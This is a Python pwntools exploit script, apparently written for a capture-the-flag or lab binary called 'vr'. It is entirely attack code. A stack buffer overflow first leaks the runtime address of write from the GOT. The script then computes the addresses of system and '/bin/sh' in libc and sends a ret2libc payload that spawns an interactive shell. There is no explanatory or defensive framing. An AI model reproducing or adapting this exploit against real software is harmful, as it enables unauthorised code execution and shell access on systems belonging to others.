from pwn import *

vb = ELF('vr')
libc = ELF('libc.so.6')

print '=====stage.1====='
write_plt = vb.plt['write']
write_got = vb.got['write']
print 'write_plt = ' + hex(write_plt)
print 'write_got = ' + hex(write_got)
print 'write_sym = ' + hex(vb.symbols['write'])
addr_bin = 0xb7f4bdc8
vul_func = 0x08048436 
exit_func = 0xb7e1d7f0

shellcode = 512 * 'A'
shellcode += p32(write_plt) + p32(vul_func) + p32(1) + p32(write_got) + p32(4)

p = process(['./vr', ])
p.send(shellcode)

write_addr = u32(p.recv(4))
print 'write_addr = ' + hex(write_addr)
sys_plt = libc.symbols['system']
#p.wait_for_close()
print '=================\n'

print '=====stage.2======'
print "system symbols = " + hex(sys_plt)
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
bash_addr = next(libc.search('/bin/sh')) - libc.symbols['write'] + write_addr
print 'system addr = ' + hex(system_addr)
print 'libc.search(/bin/sh) = ' + hex(next(libc.search('/bin/sh')))
print 'libc.symbols[write] = ' + hex(libc.symbols['write'])
print 'write_addr = ' + hex(write_addr)
print 'bin/bash addr = ' + hex(bash_addr)

shellcode = 512 * 'A'
shellcode += p32(system_addr) + p32(exit_func) + p32(bash_addr)

#p = process('./vr')
p.send(shellcode)
print '==================\n'

p.interactive()
